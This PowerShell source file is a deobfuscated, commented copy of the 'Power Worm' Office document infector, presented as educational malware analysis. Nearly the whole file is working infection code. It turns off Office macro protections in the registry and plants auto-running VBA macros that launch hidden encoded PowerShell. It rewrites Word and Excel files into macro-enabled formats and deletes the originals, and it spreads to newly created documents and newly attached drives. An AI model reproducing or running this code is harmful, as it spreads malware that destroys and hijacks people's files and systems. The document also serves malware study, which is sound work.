<#
TERMS OF USE: Considering I am not the original author of this malware, I
cannot apply any formal license to this work. I can, however, apply a
gentleman's clause to the use of this script which is dictated as follows:

DBAD Clause v0.1
----------------
Don't be a douche. This malware has little to no legitimate use and as such, I
reserve the right to publicly shame you if you are caught using this for
malicious purposes. The sole purpose of publishing this malware is to inform
and educate.

Lastly, I have redacted portions of the malware where necessary. Redactions
will be evident in the code.
#>

<#
STEP #3
This is the fully deobfuscated and cleaned up version of the XLS Power Worm Office document infector payload.
#>

$MachineGuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID

# Disable Office security features. This causes macros to be executed automatically upon opening
# a document or spreadsheet. These settings also must be enabled in order to view and edit macros.
Set-ItemProperty HKCU:\Software\Microsoft\Office\*\*\Security -Name AccessVBOM -Type DWORD -Value 1
Set-ItemProperty HKCU:\Software\Microsoft\Office\*\*\Security -Name VBAWarnings -Type DWORD -Value 1
Get-ItemProperty HKCU:\Software\Microsoft\Office\*\Excel\Resiliency\DisabledItems | Remove-Item
Get-ItemProperty HKCU:\Software\Microsoft\Office\*\Word\Resiliency\DisabledItems | Remove-Item

function Set-WordDocumentMacroPayload($WordFile, $MacroPayload, $WordComObject)
{
    if ($WordComObject.Tasks.Exists($WordFile.BaseName))
    {
        return
    }
    
    $WordDoc = $WordComObject.Documents.Open($WordFile.FullName)
    $CodeModule = $WordDoc.VBProject.VBComponents.Item(1).CodeModule

    if ($CodeModule.CountOfLines -gt 0)
    {
        $CodeModule.DeleteLines(1, $CodeModule.CountOfLines)
    }
    
    $CodeModule.AddFromString($MacroPayload)
    
    # Get the full path of the document and force the extension to be .doc
    if ($WordFile.DirectoryName[-1] -eq '\')
    {
        $DocFullPath = $WordFile.DirectoryName + $WordFile.BaseName + '.doc'
    }
    else
    {
        $DocFullPath = $WordFile.DirectoryName + '\' + $WordFile.BaseName + '.doc'
    }

    # http://msdn.microsoft.com/en-us/library/ff839952(v=office.14).aspx
    $wdFormatXMLDocumentMacroEnabled = 13
    
    # If the document was a .docx file, downgrade it to a .doc
    $WordDoc.SaveAs([ref]$DocFullPath, [ref] $wdFormatXMLDocumentMacroEnabled)
    $WordDoc.Close()
    
    # Delete the original .docx
    if (($WordFile.Extension -eq '.docx') -and (Test-Path $DocFullPath))
    {
        Remove-Item $WordFile.FullName
    }
}

function Set-ExcelDocumentMacroPayload($ExcelFile, $MacroPayload, $ExcelComObject)
{
    $Workbook =$ExcelComObject.workbooks.Open($ExcelFile.FullName)
    $CodeModule = $Workbook.VBProject.VBComponents.Item(1).CodeModule
    $CodeModule.DeleteLines(1, $CodeModule.CountOfLines)
    $CodeModule.AddFromString($MacroPayload)
    
    # Get the full path of the document and force the extension to be .xls
    if ($ExcelFile.DirectoryName[-1] -eq '\')
    {
        $XlsFullPath = $ExcelFile.DirectoryName + $ExcelFile.BaseName + '.xls'
    }
    else
    {
        $XlsFullPath = $ExcelFile.DirectoryName + '\' + $ExcelFile.BaseName + '.xls'
    }
    
    # http://msdn.microsoft.com/en-us/library/ff198017(v=office.14).aspx
    $xlExcel8 = 56

    # If the document was a .xlsx file, downgrade it to an .xls
    $Workbook.SaveAs($XlsFullPath, $xlExcel8)
    $Workbook.Close()
    
    if (($ExcelFile.Extension -eq '.xlsx') -and (Test-Path $XlsFullPath))
    {
        Remove-Item $ExcelFile.FullName
    }
}

function New-MaliciousMacroPayload
{
    Param (
        [ValidateSet('excel', 'word')]
        [String]
        $InfectionType
    )

    $Newline = [Environment]::NewLine

    # Get the original infection payload that was stored in the registry
    $EncodedInfectorPayload = (Get-ItemProperty HKCU:\\Software\Microsoft).($MachineGuid + '0')
    $EncodedInfectorPayloadLength = $EncodedInfectorPayload.Length

    # Get a random number between 500 and 799
    $RandomNum = Get-Random -Minimum 500 -Maximum 800

    # The encoded payload string will be broken up into the randomly selected interval,
    # presumably to bypass antivirus static byte signatures.
    $StringSeparatorInterval = [Math]::Floor($EncodedInfectorPayloadLength/$RandomNum)

    $MacroPayload = ""
    
    for ($i=0; $i -lt $StringSeparatorInterval ; $i++)
    {
        $MacroPayload += '& "' + $EncodedInfectorPayload.Substring($i*$RandomNum,$RandomNum) + '" _' + $Newline
    }
    
    if($gw=$EncodedInfectorPayloadLength%$RandomNum)
    {
        $MacroPayload += '& "' + $EncodedInfectorPayload.Substring($EncodedInfectorPayloadLength-$gw) + '" _' + $Newline
    }
    
    $MacroPayload = $Newline + 'b = ' + $MacroPayload.Substring(2, $MacroPayload.Length-6) + $Newline + 'Set a = CreateObject("WScript.Shell")' + $Newline + 'a.Run "powershell.exe" & " -noexit -encodedcommand " & b, 0, False' + $Newline
    
    if ($InfectionType -eq "excel")
    {
        return "Private Sub Workbook_Open()" + $MacroPayload + "End Sub"
    }
    else
    {
        return "Sub AutoOpen()" + $MacroPayload + "End Sub"
    }
}

function Set-OfficeDocPayload($OfficeDocPath)
{
    $FileOpenAttempts = 0
    
    # Attempt to get a write handle to the file to be infected.
    # Try for approx. 180 seconds. Otherwise, the document is
    # probably currently open.
    do
    {
        sleep 1

        $File = Get-Item $OfficeDocPath
        $WriteHandle = $File.OpenWrite()
        $FileOpenAttempts++
        $WriteHandle.Close()
        
        if ($FileOpenAttempts -gt 180)
        {
            return
        }
        
    }
    while (!$WriteHandle)
    
    if ($FileOpenAttempts -gt 180)
    {
        return
    }
    
    # Match on .doc, docx, or .docm files
    if ($File.Extension -match ".doc")
    {
        $Word = New-Object -ComObject Word.Application
        $Word.DisplayAlerts = "wdAlertsNone"
        # If there is an existing macro, don't have Word automatically execute it
        $Word.AutomationSecurity = "msoAutomationSecurityForceDisable"

        $WordMacro = New-MaliciousMacroPayload 'word'
        Set-WordDocumentMacroPayload $File $WordMacro $Word
        # Kill orphaned Word process
        Get-Process winword | ? { $_.MainWindowHandle -eq 0 } | Stop-Process
    }
    
    # Match on .xls, .xlsx, or .xlsm files
    if ($File.Extension -match ".xls")
    {
        $Excel = New-Object -ComObject Excel.Application
        $Excel.DisplayAlerts = $False
        # If there is an existing macro, don't have Excel automatically execute it
        $Excel.AutomationSecurity = "msoAutomationSecurityForceDisable"

        $ExcelMacro = New-MaliciousMacroPayload 'excel'
        Set-ExcelDocumentMacroPayload $File $ExcelMacro $Excel
        # Kill orphaned Excel process
        Get-Process excel | ? { $_.MainWindowHandle -eq 0 } | Stop-Process
    }
}

function Start-ExistingDriveInfection
{
    # Get currently mounted drives
    $MountedDrives = Get-PSDrive | ? { $_.Free }
    
    foreach($Drive in $MountedDrives)
    {
        $OfficeExtensions = "*.doc", "*.docx", "*.xls", "*.xlsx"
        
        foreach ($Extension in $OfficeExtensions)
        {
            $EventName = $Drive.Root + $Extension
            $FileSystemWatcher = New-Object IO.FileSystemWatcher $Drive.Root, $Extension -Property @{IncludeSubdirectories = $True; NotifyFilter = [IO.NotifyFilters]'FileName, LastWrite'}

            # Perform the following action upon creation of a new Office document
            $NewOfficeDocEvent = Register-ObjectEvent $FileSystemWatcher Created -SourceIdentifier $EventName -Action {
                if (!$OfficeDocArray)
                {
                    $OfficeDocArray = @()
                }
                
                $OfficeDocPath = $Event.SourceEventArgs.FullPath
                
                # Don't consider temporary files
                if (($OfficeDocPath -notlike "*$*") -and ($OfficeDocPath -notlike "*~*") -and ($OfficeDocPath -notlike "temp") -and ($OfficeDocPath -notlike "tmp"))
                {
                    $FileExtension = [IO.Path]::GetExtension($OfficeDocPath)
                    
                    if (($FileExtension -eq ".xls") -or ($FileExtension -eq ".xlsx") -or ($FileExtension -eq ".doc") -or ($FileExtension -eq ".docx"))
                    {
                        if ($OfficeDocArray -notcontains $OfficeDocPath)
                        {
                            $OfficeDocArray += $OfficeDocPath
                            
                            while (@((Get-Job | ? {$_.Name -match "Job"}) | ? {$_.State -eq "Running"}).count -gt 0)
                            {
                                Start-Sleep 1
                            }
                            
                            Start-Job -ScriptBlock {
                                $OfficeDocPath = $args[0]
                                $MachineGuid = $args[1]
                                $EncodedPayload3 = (Get-ItemProperty HKCU:\Software\Microsoft).($MachineGuid + '1')

                                # Execute the contents of this script (i.e. PowerWorm_Part_3.ps1) from the registry
                                Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedPayload3)))
                                
                                Set-OfficeDocPayload ($OfficeDocPath)
                            } -ArgumentList $OfficeDocPath, $MachineGuid
                        }
                    }
                }
            }
        }
    }
}

function Invoke-OfficeDocInfection($DriveLetter)
{
    # Get all office documents from the drive specified
    $OfficeDocs = Get-ChildItem $DriveLetter -Recurse -Include "*.doc","*.docx","*.xls","*.xlsx"
    
    if ($OfficeDocs.Count -ne 0)
    {
        $Excel = New-Object -ComObject Excel.Application
        $Excel.DisplayAlerts = $False
        $Excel.AutomationSecurity = "msoAutomationSecurityForceDisable"
        $Word = New-Object -ComObject Word.Application
        $Word.DisplayAlerts = "wdAlertsNone"
        $Word.AutomationSecurity = "msoAutomationSecurityForceDisable"

        $ExcelMacro = New-MaliciousMacroPayload 'excel'
        $WordMacro = New-MaliciousMacroPayload 'word'
        
        foreach ($Document in $OfficeDocs)
        {
            $FileStream = $Document.OpenWrite()
            
            if ($FileStream)
            {
                $FileStream.Close()
                
                # This will match .doc and .docx
                if ($Document.Extension -match ".doc")
                {
                    Set-WordDocumentMacroPayload $Document $WordMacro $Word
                }
                
                # This will match .xls and .xlsx
                if ($Document.Extension -match ".xls")
                {
                    Set-ExcelDocumentMacroPayload $Document $ExcelMacro $Excel
                }
            }
        }
        
        Get-Process excel | ? { $_.MainWindowHandle -eq 0 } | Stop-Process
        Get-Process winword | ? { $_.MainWindowHandle -eq 0 } | Stop-Process
    }
}

function Start-NewDriveInfection
{
    $NewDriveAddedAction = {
        $DriveLetter = $EventArgs.NewEvent.TargetInstance.Caption + '\'
        Start-Job -ScriptBlock {
            $DriveLetter = $args[0]
            $MachineGuid = $args[1]

            # Get the contents of the stage 1 payload (i.e. this script) from the registry where is was saved upon initial infection
            $Stage1PayloadEncoded = (Get-ItemProperty HKCU:\\Software\Microsoft).($MachineGuid + '1')
            $Stage1PayloadBytes = [Convert]::FromBase64String($Stage1PayloadEncoded)
            $Stage1Payload = [Text.Encoding]::Unicode.GetString($Stage1PayloadBytes)

            Invoke-Expression $Stage1Payload
            
            Invoke-OfficeDocInfection($DriveLetter)
        } -ArgumentList $DriveLetter, $MachineGuid
    }

    # Register an event for when a new disk appears - e.g. a USB external hard drive is attached
    Register-WmiEvent -Query "Select * from __InstanceCreationEvent within 5 where targetinstance isa 'win32_logicaldisk'" -Action $NewDriveAddedAction
}
